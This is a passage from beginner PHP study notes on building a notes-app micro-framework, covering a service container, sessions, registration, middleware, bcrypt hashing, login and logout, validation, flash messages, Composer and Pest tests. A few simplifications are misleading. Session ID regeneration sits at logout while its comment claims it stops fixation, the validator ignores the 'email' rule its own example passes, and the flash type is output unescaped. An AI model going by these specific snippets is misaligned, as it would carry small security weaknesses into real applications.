Each file is tiny and does exactly one thing. This is the **Single Responsibility Principle**.

`notes/destroy.php`:
```php
<?php

$db = \Core\App::resolve('Core\Database');

$note = $db->query('SELECT * FROM notes WHERE id = :id', [
    'id' => $_POST['id']
])->findOrFail();

// Authorization
if ($note['user_id'] !== $_SESSION['user']['id']) {
    abort(403);
}

$db->query('DELETE FROM notes WHERE id = :id', ['id' => $_POST['id']]);

redirect('/notes');
```

---

## 34. Make Your First Service Container

**The container solves: how do I get a Database instance anywhere without passing it around?**

**The problem without a container:**

```php
// Every controller has to do this setup manually
$config = require 'config.php';
$db = new Database($config['database']);
// ^ repeated in every controller!
```

**The solution — a container:**

```php
class Container
{
    protected array $bindings = [];

    // Register: "here's HOW to build a Database"
    public function bind(string $key, callable $resolver): void
    {
        $this->bindings[$key] = $resolver;
    }

    // Build and return it
    public function resolve(string $key): mixed
    {
        return call_user_func($this->bindings[$key]);
    }
}
```

**Register in `bootstrap.php` (once):**
```php
$container->bind('Core\Database', function() {
    $config = require base_path('config.php');
    return new \Core\Database($config['database']);
});
```

**Use anywhere:**
```php
$db = \Core\App::resolve('Core\Database');
// The container builds the Database with the right config automatically
```

**Why this is powerful:**
- Centralizes construction logic
- In tests, you can swap `Core\Database` with a fake test database
- Controllers don't need to know HOW the database is built — just that they can get one

---

## 35. Updating With PATCH Requests

**Editing an existing record.**

`views/notes/edit.view.php`:
```html
<form method="POST" action="/notes">
    <input type="hidden" name="_method" value="PATCH">
    <input type="hidden" name="id" value="<?= $note['id'] ?>">

    <textarea name="body"><?= e($note['body']) ?></textarea>
    <button>Update Note</button>
</form>
```

`Http/controllers/notes/update.php`:
```php
<?php

$db = \Core\App::resolve('Core\Database');

// Validate
if (! Validator::string($_POST['body'], 1, 1000)) {
    // handle error...
}

$note = $db->query('SELECT * FROM notes WHERE id = :id', [
    'id' => $_POST['id']
])->findOrFail();

// Authorization
if ($note['user_id'] !== $_SESSION['user']['id']) {
    abort(403);
}

// Update
$db->query('UPDATE notes SET body = :body WHERE id = :id', [
    'body' => $_POST['body'],
    'id'   => $_POST['id']
]);

redirect('/notes');
```

---

## 36. PHP Sessions 101

**Sessions let you remember data about a user across multiple page loads.**

HTTP is stateless — each request is independent. Sessions solve this by storing data on the server and giving the browser a cookie with a session ID.

```php
// Start the session — must be BEFORE any output
session_start();

// Store data
$_SESSION['user'] = ['id' => 1, 'name' => 'Ahmed'];

// Read data on any other page
echo $_SESSION['user']['name'];   // Ahmed

// Remove one item
unset($_SESSION['user']);

// Destroy the entire session (log out)
session_destroy();
```

**How sessions work behind the scenes:**
1. First visit → PHP creates a unique session ID (e.g. `abc123xyz`)
2. PHP saves `$_SESSION` data in a file on the server
3. PHP sends the session ID to the browser as a cookie: `PHPSESSID=abc123xyz`
4. Next request → browser sends the cookie back
5. PHP reads the cookie, loads the matching session file, populates `$_SESSION`

**Session vs Cookie:**
- Session data lives on the **server** — user can't tamper with it
- Cookie data lives in the **browser** — user can see and modify it
- Sessions use a cookie only to store the session ID, not the actual data

---

## 37. Register a New User

**The user registration flow:**

1. User fills out registration form (name, email, password)
2. Validate all fields
3. Check the email isn't already taken
4. Hash the password — never store plain text
5. Insert into `users` table
6. Log them in (set `$_SESSION['user']`)
7. Redirect to the app

`Http/controllers/users/store.php`:
```php
<?php

$errors = [];

// Validate
if (! Validator::string($_POST['name'], 1, 255)) {
    $errors['name'] = 'Name is required.';
}
if (! Validator::email($_POST['email'])) {
    $errors['email'] = 'A valid email is required.';
}
if (! Validator::string($_POST['password'], 8, 255)) {
    $errors['password'] = 'Password must be at least 8 characters.';
}

// Check email uniqueness
$db = \Core\App::resolve('Core\Database');
$existingUser = $db->query(
    'SELECT id FROM users WHERE email = :email',
    ['email' => $_POST['email']]
)->find();

if ($existingUser) {
    $errors['email'] = 'This email is already registered.';
}

if (!empty($errors)) {
    view('users/register.view.php', ['errors' => $errors]);
    exit();
}

// Hash the password
$hashedPassword = password_hash($_POST['password'], PASSWORD_BCRYPT);

// Insert the user
$db->query(
    'INSERT INTO users (name, email, password) VALUES (:name, :email, :password)',
    [
        'name'     => $_POST['name'],
        'email'    => $_POST['email'],
        'password' => $hashedPassword
    ]
);

// Log them in
$user = $db->query(
    'SELECT * FROM users WHERE email = :email',
    ['email' => $_POST['email']]
)->find();

$_SESSION['user'] = $user;

redirect('/notes');
```

---

## 38. Introduction to Middleware

**Middleware is code that runs between the request and the controller.**

Think of it as a security checkpoint — before the controller runs, middleware checks conditions.

**Use cases:**
- `auth` middleware — redirect to login if not logged in
- `guest` middleware — redirect logged-in users away from login/register pages

```php
// Core/Middleware/Authenticate.php
namespace Core\Middleware;

class Authenticate
{
    public function handle(): void
    {
        if (! isset($_SESSION['user'])) {
            redirect('/login');
            exit();
        }
    }
}

// Core/Middleware/Guest.php
class Guest
{
    public function handle(): void
    {
        if (isset($_SESSION['user'])) {
            redirect('/notes');   // already logged in, go to app
            exit();
        }
    }
}
```

**Register middleware types:**
```php
class Middleware
{
    const MAP = [
        'auth'  => Authenticate::class,
        'guest' => Guest::class,
    ];

    public static function resolve(string $key): void
    {
        (new static::MAP[$key])->handle();
    }
}
```

**Attach middleware to routes:**
```php
// In Router — add only() method
public function only(string $key): static
{
    Middleware::resolve($key);
    return $this;
}

// In routes.php
$router->get('/notes', 'notes/index.php')->only('auth');
$router->get('/login', 'session/create.php')->only('guest');
```

---

## 39. Manage Passwords Like This Forever

**The two password functions you'll use for your entire career:**

```php
// HASHING (when registering or changing password)
$hash = password_hash($plainTextPassword, PASSWORD_BCRYPT);
// Returns something like: $2y$10$abc123...  (60 characters)
// Different hash every time even for the same password (salt is built in)

// VERIFYING (when logging in)
$isCorrect = password_verify($plainTextPassword, $hashFromDatabase);
// Returns true or false
```

**Why you can't use MD5 or SHA1:**
```php
md5('password') = "5f4dcc3b5aa765d61d8327deb882cf99"
// Always the same output → rainbow table attacks crack these instantly
```

**Why bcrypt is safe:**
- Deliberately slow to compute (makes brute-force take years)
- Automatically adds a random "salt" — same password hashes differently each time
- Industry standard, used by Laravel, Symfony, Django, Rails

**Rule:** `password_hash()` on the way in. `password_verify()` on the way out. Never store plain text. Never use MD5/SHA1 for passwords.

---

## 40. Log In and Log Out

**Login flow:**

1. User submits email + password
2. Find the user by email
3. If not found → show error
4. If found → verify the password with `password_verify()`
5. If wrong password → show error
6. If correct → save user to session, redirect to app

`Http/controllers/sessions/store.php`:
```php
<?php

$db = \Core\App::resolve('Core\Database');

$user = $db->query(
    'SELECT * FROM users WHERE email = :email',
    ['email' => $_POST['email']]
)->find();

// Validate credentials
$errors = [];

if (! $user || ! password_verify($_POST['password'], $user['password'])) {
    // Vague message on purpose — don't reveal whether the email exists
    $errors['email'] = 'No account found with those credentials.';
}

if (!empty($errors)) {
    view('sessions/create.view.php', ['errors' => $errors]);
    exit();
}

// Log in
$_SESSION['user'] = $user;

redirect('/notes');
```

**Logout:**

`Http/controllers/sessions/destroy.php`:
```php
<?php

// Clear the user from the session
unset($_SESSION['user']);

// Go back to login page
redirect('/');
```

---

## 41. Extract a Form Validation Object

**Create a reusable validation object that collects all errors.**

```php
class ValidationException extends \Exception
{
    public array $errors;

    public function __construct(array $errors)
    {
        $this->errors = $errors;
    }
}
```

```php
class Validator
{
    private array $errors = [];

    public function validate(array $data, array $rules): array
    {
        foreach ($rules as $field => $rule) {
            if ($rule === 'required' && empty($data[$field])) {
                $this->errors[$field] = "$field is required.";
            }
        }

        return $this->errors;
    }
}
```

Now validation in controllers is clean:

```php
$errors = (new Validator())->validate($_POST, [
    'body'  => 'required',
    'email' => 'required|email',
]);

if (!empty($errors)) {
    throw new ValidationException($errors);
}
```

---

## 42. Extract an Authenticator Class

**Move login/logout logic into a dedicated class.**

```php
<?php

namespace Core;

class Authenticator
{
    public function attempt(string $email, string $password): bool
    {
        $user = App::resolve(Database::class)
            ->query('SELECT * FROM users WHERE email = :email', ['email' => $email])
            ->find();

        if (! $user) {
            return false;
        }

        if (! password_verify($password, $user['password'])) {
            return false;
        }

        // Log them in
        $_SESSION['user'] = $user;
        return true;
    }

    public function logout(): void
    {
        unset($_SESSION['user']);
        session_regenerate_id(true);   // prevents session fixation attacks
    }
}
```

**Usage in controller:**

```php
$auth = new \Core\Authenticator();

if (! $auth->attempt($_POST['email'], $_POST['password'])) {
    // show error
}

redirect('/notes');
```

---

## 43. The PRG Pattern and Session Flashing

**PRG = Post / Redirect / Get**

**The problem without PRG:**
1. User submits form → `POST /notes`
2. Controller saves the note → renders the notes page
3. User presses F5 (refresh)
4. Browser says: "Resend POST request?"
5. Note gets saved again — duplicate!

**The solution — PRG:**
1. User submits form → `POST /notes`
2. Controller saves the note → **redirects** to `GET /notes`
3. User presses F5 → refreshes the GET request → no duplicate

```php
// store.php — after saving
$db->query('INSERT INTO notes (body) VALUES (:body)', ['body' => $_POST['body']]);

// Redirect instead of rendering
redirect('/notes');   // browser now makes a GET request
```

**Session Flashing — show a message once after redirect:**

```php
// Before redirecting — store a success message
$_SESSION['flash'] = ['type' => 'success', 'message' => 'Note created!'];
redirect('/notes');
```

In the view (and then delete from session):
```php
<?php if (isset($_SESSION['flash'])): ?>
    <div class="alert alert-<?= $_SESSION['flash']['type'] ?>">
        <?= e($_SESSION['flash']['message']) ?>
    </div>
    <?php unset($_SESSION['flash']); ?>
<?php endif; ?>
```

---

## 44. Flash Old Form Data to the Session

**Repopulate the form after a failed validation.**

When validation fails and you redirect back, the form is empty. That's frustrating for the user.

```php
// When validation fails — flash the old data to session
$_SESSION['old'] = $_POST;
redirect('/notes/create');
```

In the form view:
```php
<?php
// Read old data from session and immediately delete it
$old = $_SESSION['old'] ?? [];
unset($_SESSION['old']);
?>

<form method="POST" action="/notes">
    <textarea name="body"><?= e($old['body'] ?? '') ?></textarea>
    <button>Save</button>
</form>
```

Now when the user submits with an error, they come back to the form with their text still there.

---

## 45. Automatically Redirect Back Upon Failed Validations

**A helper that makes going back + flashing errors automatic.**

Add to `functions.php`:

```php
function redirect_back_with_errors(array $errors): never
{
    // Flash errors to session
    $_SESSION['errors'] = $errors;

    // Flash old input to session
    $_SESSION['old'] = $_POST;

    // Go back to the previous page
    header('location: ' . $_SERVER['HTTP_REFERER']);
    exit();
}
```

In any controller:
```php
if (!empty($errors)) {
    redirect_back_with_errors($errors);
}
```

At the top of the form view:
```php
<?php
$errors = $_SESSION['errors'] ?? [];
$old    = $_SESSION['old'] ?? [];

unset($_SESSION['errors'], $_SESSION['old']);
?>
```

This pattern is exactly what Laravel's `back()->withErrors()` does.

---

## 46. Composer and Free Autoloading

**Composer is PHP's package manager — like npm for JavaScript.**

Install Composer from: https://getcomposer.org

**Initialize a project:**
```bash
composer init
```

This creates `composer.json`. Add PSR-4 autoloading:

```json
{
    "autoload": {
        "psr-4": {
            "Core\\": "Core/"
        },
        "files": [
            "Core/functions.php"
        ]
    }
}
```

Then run:
```bash
composer dump-autoload
```

This generates `vendor/autoload.php`. Include it in `bootstrap.php`:

```php
require __DIR__ . '/vendor/autoload.php';
```

Now you never write `require` for your own classes again — Composer handles it.

**PSR-4 rule:** `Core\Database` class → lives in `Core/Database.php`. The namespace matches the folder.

---

## 47. Install Two Composer Packages

**Install packages with `composer require`.**

```bash
# Collections — Laravel-style array helpers
composer require tightenco/collect

# PestPHP — modern testing framework
composer require pestphp/pest --dev
```

**Collections** — wrapping arrays with powerful methods:

```php
use Illuminate\Support\Collection;

$notes = collect([
    ['id' => 1, 'body' => 'Buy groceries', 'user_id' => 1],
    ['id' => 2, 'body' => 'Call bank',     'user_id' => 2],
]);

// Filter and get values — much cleaner than array_filter
$myNotes = $notes->where('user_id', 1)->values();

// Map all bodies to uppercase
$upper = $notes->pluck('body')->map(fn($b) => strtoupper($b));
```

**Pest** — testing framework that makes tests readable:

```php
// tests/Unit/ValidatorTest.php

it('requires a string to have a minimum length', function() {
    expect(Validator::string('hi', 3))->toBeFalse();
    expect(Validator::string('hello', 3))->toBeTrue();
});

it('validates an email address', function() {
    expect(Validator::email('not-an-email'))->toBeFalse();
    expect(Validator::email('ahmed@example.com'))->toBeTrue();
});
```

Run tests:
```bash
./vendor/bin/pest
```

---

## 48. Testing Approaches, Terms, and Considerations

**Why write tests?**

Without tests: you change one thing → something else breaks → you find out from a user.
With tests: you change one thing → tests immediately tell you what broke.

**Types of tests:**

| Type | Tests | Speed |
|------|-------|-------|
| Unit | One function or class in isolation | Very fast |
| Integration | Multiple parts working together | Medium |
| Feature/E2E | Whole user flows end-to-end | Slow |

**Key terms:**

- **Assertion** — a statement that must be true: `expect($result)->toBe(5)`
- **Test suite** — the full collection of all tests
- **Passing test** — assertion is true (green)
- **Failing test** — assertion is false (red)
- **TDD** (Test Driven Development) — write the test first, then write the code to make it pass

**A good unit test:**

```php
it('filters notes by user id', function() {
    // Arrange — set up the data
    $notes = [
        ['body' => 'Note A', 'user_id' => 1],
        ['body' => 'Note B', 'user_id' => 2],
        ['body' => 'Note C', 'user_id' => 1],
    ];

    // Act — run the code
    $result = array_filter($notes, fn($n) => $n['user_id'] === 1);

    // Assert — check the result
    expect($result)->toHaveCount(2);
});
```

**Testing considerations:**
- Test the important paths — happy path and common error paths
- Don't test framework code, test YOUR logic
- Tests should be isolated — one test's result shouldn't affect another
- Aim for fast tests so you run them often

---

## 🗺️ The Big Picture

Here's how everything connects into the final micro-framework:

```
Request comes in
       ↓
public/.htaccess  →  Routes all URLs to public/index.php
       ↓
public/index.php  →  Loads bootstrap.php, then calls Router::resolve()
       ↓
bootstrap.php     →  Autoloader, session_start(), Container bindings
       ↓
Router            →  Matches URI + method, runs Middleware, loads controller
       ↓
Middleware        →  Auth check (redirect if not logged in)
       ↓
Controller        →  Uses App::resolve() to get Database, runs query
       ↓
Database          →  Prepared statement runs against MySQL
       ↓
view()            →  Loads .view.php file, extracts variables into it
       ↓
Browser           →  Receives rendered HTML
```

**The classes and what they do:**

| Class | Job |
|-------|-----|
| `Router` | Maps URLs → controller files |
| `Container` | Stores how to build services |
| `App` | Global access to the Container |
| `Database` | Safe PDO wrapper |
| `Authenticator` | Login / logout logic |
| `Validator` | Form field validation |
| `Middleware` | Auth checks before controllers run |

---

## 📝 Quick Reference Cheat Sheet

```php
// Output safely
<?= e($variable) ?>

// Load a view with data
view('notes/index.view.php', ['notes' => $notes]);

// Redirect
redirect('/notes');

// Abort with error page
abort(404);

// Get DB from container
$db = \Core\App::resolve('Core\Database');

// Safe query
$notes = $db->query('SELECT * FROM notes WHERE user_id = :id', ['id' => 1])->findAll();
$note  = $db->query('SELECT * FROM notes WHERE id = :id', ['id' => $id])->findOrFail();

// Session
$_SESSION['user'] = $user;       // set
$user = $_SESSION['user'];       // get
unset($_SESSION['user']);         // delete

// Password
$hash    = password_hash($plain, PASSWORD_BCRYPT);
$isValid = password_verify($plain, $hash);

// Validate
Validator::string($value, $min, $max);
Validator::email($value);
```

---

*Study these notes section by section. Code along with every example. The goal isn't to memorize — it's to understand why each pattern exists. Once you understand the why, the how becomes obvious.*
